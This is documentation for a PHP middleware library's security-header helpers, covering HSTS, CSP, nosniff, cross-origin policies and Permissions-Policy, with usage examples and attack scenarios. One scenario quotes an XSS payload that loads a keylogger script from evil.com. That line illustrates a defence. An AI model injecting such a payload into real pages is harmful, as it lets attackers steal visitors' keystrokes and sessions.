# Security headers

## Why you would want this — three concrete scenarios

**Stolen session cookie.** Your user logs into your admin panel from a hotel wifi. The wifi access point downgrades their connection to HTTP for two seconds during the initial DNS lookup. The browser sends the session cookie in clear text. Attacker on the same network captures it, replays it, hijacks the session. With **HSTS** (`Strict-Transport-Security: max-age=31536000`), the browser refuses any HTTP downgrade for the next year — the request stays HTTPS or fails closed.

**Uploaded "harmless.jpg" executes as JavaScript.** You let users upload avatars. An attacker uploads a file whose bytes are valid JavaScript with a `.jpg` extension. When a victim's browser fetches the avatar, your CDN serves it with no `Content-Type`, the browser sniffs the content, sees JS, executes it in your origin context — full session hijack. With `X-Content-Type-Options: nosniff`, the browser is forced to use the declared MIME type and refuses to execute non-JS content.

**Single injected `<script>` owns every visitor.** A user posts a comment containing `<script src="https://evil.com/keylogger.js"></script>`. Without a strict **Content-Security-Policy**, every visitor's browser fetches and runs that script — keyloggers, cookie stealing, drive-by downloads. With `default-src 'self'`, the browser refuses to load any script that isn't from your own origin.

Each of these headers is a one-line server-side switch that blocks an entire class of browser attack. The helpers below apply them in one call with typed values — no magic strings, no easy-to-forget directives.

---

`oihana/php-middleware` ships four procedural helpers to apply the most common HTTP security response headers to a PSR-7 response:

- [`withSecurityHeaders()`](#withsecurityheaders) — the single entry point that applies HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Content-Security-Policy, the three Cross-Origin policies (COOP / COEP / CORP) and Permissions-Policy in one call.
- [`withDefaultSecurityBaseline()`](#withdefaultsecuritybaseline) — opinionated wrapper over `withSecurityHeaders()` that pre-fills a "safe-for-most-apps" baseline, with caller overrides merged on top.
- [`buildCspHeader()`](#buildcspheader) — sub-helper that composes a `Content-Security-Policy` header value from a directive array.
- [`buildPermissionsPolicyHeader()`](#buildpermissionspolicyheader) — sub-helper that composes a `Permissions-Policy` header value from a feature array.

All four are PSR-7 immutable: they return a **new** `ResponseInterface` — the supplied instance is never mutated.

## `withSecurityHeaders()`

```php
namespace oihana\middleware\helpers\security ;

function withSecurityHeaders( ResponseInterface $response , array $options = [] ) : ResponseInterface ;
```

The `$options` array is keyed by [`SecurityHeadersOption`](../../src/oihana/middleware/enums/SecurityHeadersOption.php) constants. Every option is **opt-in**: omitting a key leaves the response untouched on that front.

### Supported options

| Option | Type | Effect |
| :--- | :--- | :--- |
| `HSTS` | `int\|null` | `Strict-Transport-Security: max-age=N`. `null` or `0` ⇒ no header. |
| `HSTS_INCLUDE_SUBDOMAINS` | `bool` (default `true`) | Adds `; includeSubDomains` when HSTS is emitted. |
| `HSTS_PRELOAD` | `bool` (default `false`) | Adds `; preload` (see https://hstspreload.org). |
| `FRAME_OPTIONS` | `string\|null` | Value of `X-Frame-Options`. Use `FrameOptions::DENY` or `FrameOptions::SAME_ORIGIN`. |
| `CONTENT_TYPE_NOSNIFF` | `bool` (default `false`) | Emits `X-Content-Type-Options: nosniff` when `true`. |
| `REFERRER_POLICY` | `string\|null` | Value of `Referrer-Policy`. Use the `ReferrerPolicy::*` constants. |
| `CSP` | `string\|array\|null` | Value of `Content-Security-Policy`. If `array`, forwarded to `buildCspHeader()`. |
| `CSP_REPORT_ONLY` | `bool` (default `false`) | When `true`, emits `Content-Security-Policy-Report-Only` instead of `Content-Security-Policy`. Useful to test a policy in production without enforcing it. |
| `COOP` | `string\|null` | Value of `Cross-Origin-Opener-Policy`. Use the `CrossOriginOpenerPolicy::*` constants. |
| `COEP` | `string\|null` | Value of `Cross-Origin-Embedder-Policy`. Use the `CrossOriginEmbedderPolicy::*` constants. |
| `CORP` | `string\|null` | Value of `Cross-Origin-Resource-Policy`. Use the `CrossOriginResourcePolicy::*` constants. |
| `PERMISSIONS_POLICY` | `string\|array\|null` | Value of `Permissions-Policy`. If `array`, forwarded to `buildPermissionsPolicyHeader()`. |

### Usage

```php
use function oihana\middleware\helpers\security\withSecurityHeaders ;
use oihana\middleware\enums\SecurityHeadersOption ;
use oihana\middleware\enums\FrameOptions ;
use oihana\middleware\enums\ReferrerPolicy ;
use oihana\middleware\enums\CspDirective ;

$response = withSecurityHeaders( $response ,
[
    SecurityHeadersOption::HSTS                 => 31536000 ,
    SecurityHeadersOption::FRAME_OPTIONS        => FrameOptions::DENY ,
    SecurityHeadersOption::CONTENT_TYPE_NOSNIFF => true ,
    SecurityHeadersOption::REFERRER_POLICY      => ReferrerPolicy::STRICT_ORIGIN_WHEN_CROSS_ORIGIN ,
    SecurityHeadersOption::CSP                  =>
    [
        CspDirective::DEFAULT_SRC => "'self'" ,
        CspDirective::IMG_SRC     => [ "'self'" , 'data:' ] ,
    ] ,
]) ;
```

Output on the response:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'; img-src 'self' data:
```

### CSP in report-only mode

```php
$response = withSecurityHeaders( $response ,
[
    SecurityHeadersOption::CSP             => $strictPolicy ,
    SecurityHeadersOption::CSP_REPORT_ONLY => true ,
]) ;
// => Content-Security-Policy-Report-Only: <strictPolicy>
```

Lets you deploy a strict policy in production while observing violations reported through `report-uri` / `report-to` — without breaking the app. Once zero violations are observed, switch to enforcement mode (`CSP_REPORT_ONLY: false`).

### Cross-Origin policies (COOP / COEP / CORP)

Three sibling headers controlling cross-origin interactions:

| Header | Constant | What it controls |
| :--- | :--- | :--- |
| `Cross-Origin-Opener-Policy` | `CrossOriginOpenerPolicy` | Whether a top-level document can share its browsing-context group with cross-origin documents (mitigates XS-Leaks, Spectre). |
| `Cross-Origin-Embedder-Policy` | `CrossOriginEmbedderPolicy` | Whether the document can embed cross-origin subresources without an explicit opt-in. |
| `Cross-Origin-Resource-Policy` | `CrossOriginResourcePolicy` | Which origins are allowed to embed *this* resource as a subresource. |

The classic "cross-origin isolation" triad unlocks `SharedArrayBuffer` and high-resolution timers:

```php
$response = withSecurityHeaders( $response ,
[
    SecurityHeadersOption::COOP => CrossOriginOpenerPolicy::SAME_ORIGIN ,
    SecurityHeadersOption::COEP => CrossOriginEmbedderPolicy::REQUIRE_CORP ,
    SecurityHeadersOption::CORP => CrossOriginResourcePolicy::SAME_ORIGIN ,
]) ;
```

For looser setups, `CrossOriginOpenerPolicy::SAME_ORIGIN_ALLOW_POPUPS` keeps the isolation while letting OAuth / payment popups stay in the group, and `CrossOriginEmbedderPolicy::CREDENTIALLESS` enables cross-origin isolation without requiring third-party servers to ship CORP headers.

### Permissions-Policy

Disables (or restricts) policy-controlled browser features such as the camera, microphone, geolocation, payment APIs, USB, sensors, clipboard, etc. Two accepted forms:

- a **raw string** if you want to manage the header value yourself: `'geolocation=(), camera=*'` ;
- an **array** keyed by [`PermissionsPolicyFeature`](../../src/oihana/middleware/enums/PermissionsPolicyFeature.php) constants (or raw feature names), forwarded to `buildPermissionsPolicyHeader()`.

```php
use oihana\middleware\enums\PermissionsPolicyFeature ;

$response = withSecurityHeaders( $response ,
[
    SecurityHeadersOption::PERMISSIONS_POLICY =>
    [
        PermissionsPolicyFeature::GEOLOCATION => false ,                            // deny
        PermissionsPolicyFeature::CAMERA      => 'self' ,                           // same-origin
        PermissionsPolicyFeature::PAYMENT     => [ 'self' , 'https://stripe.com' ], // self + a partner
        PermissionsPolicyFeature::FULLSCREEN  => '*' ,                              // allow all
    ] ,
]) ;
// => Permissions-Policy: geolocation=(), camera=(self), payment=(self "https://stripe.com"), fullscreen=*
```

A reasonable "deny everything sensitive" baseline:

```php
PermissionsPolicyFeature::CAMERA         => false ,
PermissionsPolicyFeature::MICROPHONE     => false ,
PermissionsPolicyFeature::GEOLOCATION    => false ,
PermissionsPolicyFeature::PAYMENT        => false ,
PermissionsPolicyFeature::USB            => false ,
PermissionsPolicyFeature::MIDI           => false ,
PermissionsPolicyFeature::BLUETOOTH      => false ,
PermissionsPolicyFeature::HID            => false ,
PermissionsPolicyFeature::SERIAL         => false ,
PermissionsPolicyFeature::IDLE_DETECTION => false ,
PermissionsPolicyFeature::LOCAL_FONTS    => false ,
```

Activate only what your app actually needs and explicitly deny everything else.

## `withDefaultSecurityBaseline()`

```php
namespace oihana\middleware\helpers\security ;

function withDefaultSecurityBaseline( ResponseInterface $response , array $overrides = [] ) : ResponseInterface ;
```

Opinionated alias of `withSecurityHeaders()` that ships a "safe-for-most-apps" baseline. Useful when you want a reasonable default without auditing every header.

### Baseline emitted

| Header | Baseline value |
| :--- | :--- |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` (1 year, subdomains included, no preload) |
| `X-Frame-Options` | `DENY` |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Cross-Origin-Opener-Policy` | `same-origin` |
| `Cross-Origin-Resource-Policy` | `same-origin` |

### NOT in the baseline (deliberate)

| Header | Why it's omitted |
| :--- | :--- |
| `Cross-Origin-Embedder-Policy: require-corp` | Would break every third-party subresource that does not ship its own `CORP` header. Enable explicitly after auditing your subresources. |
| `Content-Security-Policy` | Requires per-app inventory of allowed script / style / image sources. |
| `Permissions-Policy` | Depends on which browser features the app actually uses. |
| `Strict-Transport-Security; preload` | Requires submission to the [browser preload list](https://hstspreload.org). |

### Overrides

The `$overrides` array is merged on top of the baseline before forwarding to `withSecurityHeaders()` — caller-supplied keys win. Use this to tune a default (loosen HSTS in staging, switch to `SAMEORIGIN`, etc.) or to add headers outside the baseline (CSP, Permissions-Policy, COEP).

```php
use function oihana\middleware\helpers\security\withDefaultSecurityBaseline ;
use oihana\middleware\enums\SecurityHeadersOption ;
use oihana\middleware\enums\CrossOriginEmbedderPolicy ;

// 1. Baseline as-is
$response = withDefaultSecurityBaseline( $response ) ;

// 2. Baseline + cross-origin isolation triad + CSP
$response = withDefaultSecurityBaseline( $response ,
[
    SecurityHeadersOption::COEP => CrossOriginEmbedderPolicy::REQUIRE_CORP ,
    SecurityHeadersOption::CSP  => [ 'default-src' => "'self'" ] ,
]) ;

// 3. Loosen HSTS in staging
$response = withDefaultSecurityBaseline( $response ,
[
    SecurityHeadersOption::HSTS => 300 , // 5 minutes
]) ;
```

## `buildCspHeader()`

```php
namespace oihana\middleware\helpers\security ;

function buildCspHeader( array $directives ) : string ;
```

Composes a `Content-Security-Policy` header value from an associative array `directive => sources`.

### Accepted forms for each source

| Form | Example | Result |
| :--- | :--- | :--- |
| `string` | `'self' https://cdn.example.com` | Passed through |
| `list<string>` | `["'self'", 'https://cdn.example.com']` | Joined by space |
| `true` or `''` | `true` | Bare flag directive (e.g. `upgrade-insecure-requests`) |

Directives are joined by `'; '`. Empty input returns the empty string — the caller can then skip emitting the header entirely.

### Usage

```php
use function oihana\middleware\helpers\security\buildCspHeader ;
use oihana\middleware\enums\CspDirective ;

$value = buildCspHeader(
[
    CspDirective::DEFAULT_SRC               => "'self'" ,
    CspDirective::SCRIPT_SRC                => [ "'self'" , 'https://cdn.example.com' ] ,
    CspDirective::IMG_SRC                   => "'self' data:" ,
    CspDirective::UPGRADE_INSECURE_REQUESTS => true ,
]) ;
// => "default-src 'self'; script-src 'self' https://cdn.example.com; img-src 'self' data:; upgrade-insecure-requests"
```

The `CspDirective` enum exposes the most commonly used CSP Level 3 directives (`default-src`, `script-src`, `style-src`, `img-src`, `font-src`, `connect-src`, `media-src`, `object-src`, `frame-src`, `worker-src`, `manifest-src`, `base-uri`, `form-action`, `frame-ancestors`, `report-uri`, `report-to`, `upgrade-insecure-requests`). For a less common directive, pass the raw string as the key — the helper accepts it.

### Defense against invalid values

`buildCspHeader` throws `InvalidArgumentException` for:

- a `false` value (omit the key, or use `true` for a flag) ;
- an empty directive name ;
- an empty source in a list ;
- an unsupported value type.

These checks catch composition mistakes on the caller side early, rather than silently emitting a malformed CSP.

## `buildPermissionsPolicyHeader()`

```php
namespace oihana\middleware\helpers\security ;

function buildPermissionsPolicyHeader( array $directives ) : string ;
```

Composes a `Permissions-Policy` header value from an associative array `feature => allowlist`.

### Accepted forms for each allowlist

| Form | Example | Result |
| :--- | :--- | :--- |
| `false` | `false` | `()` — explicit deny |
| `true` or `'*'` | `true` | `*` — allow all origins (the only form without parentheses) |
| `'self'` | `'self'` | `(self)` — same-origin only |
| `'https://x.com'` | single origin string | `("https://x.com")` — auto-quoted single origin |
| `'(self "https://x.com")'` | raw string starting with `(` | Passed through verbatim |
| `['self', 'https://x.com']` | array | `(self "https://x.com")` — `self` stays a token, every other entry auto-quoted |
| `[]` | empty array | `()` — same as `false` |

Features are joined by `', '`. Empty input returns the empty string — the caller can then skip emitting the header entirely.

### Usage

```php
use function oihana\middleware\helpers\security\buildPermissionsPolicyHeader ;
use oihana\middleware\enums\PermissionsPolicyFeature ;

$value = buildPermissionsPolicyHeader(
[
    PermissionsPolicyFeature::GEOLOCATION => false ,
    PermissionsPolicyFeature::CAMERA      => 'self' ,
    PermissionsPolicyFeature::PAYMENT     => [ 'self' , 'https://stripe.com' ] ,
    PermissionsPolicyFeature::FULLSCREEN  => '*' ,
]) ;
// => 'geolocation=(), camera=(self), payment=(self "https://stripe.com"), fullscreen=*'
```

The `PermissionsPolicyFeature` enum exposes ~40 features grouped by category (privacy-sensitive, embedding & media, sensors, identity & storage, clipboard & sharing, attribution & tracking, deprecated). For a feature not exposed by the enum, pass the raw string as the key — the helper accepts it.

### Defense against invalid values

`buildPermissionsPolicyHeader` throws `InvalidArgumentException` for:

- an empty feature name ;
- an empty allowlist string ;
- a non-string or empty item in an array allowlist.

These checks catch composition mistakes on the caller side early, rather than silently emitting a malformed `Permissions-Policy`.

## See also

- [Getting started](getting-started.md) — wiring the helper inside a PSR-15 middleware.
- [CORS](cors.md) — the other helper family in this package.
- [CSP Level 3 spec](https://www.w3.org/TR/CSP3/) — official reference for the directives.
- [Referrer Policy spec](https://www.w3.org/TR/referrer-policy/) — semantics of the values.
- [Permissions Policy spec](https://www.w3.org/TR/permissions-policy/) — feature list and allowlist grammar.
- [HTML — Cross-Origin-Opener-Policy](https://html.spec.whatwg.org/multipage/browsers.html#cross-origin-opener-policies) and [Cross-Origin-Embedder-Policy](https://html.spec.whatwg.org/multipage/browsers.html#coep) — official semantics of the two isolation headers.
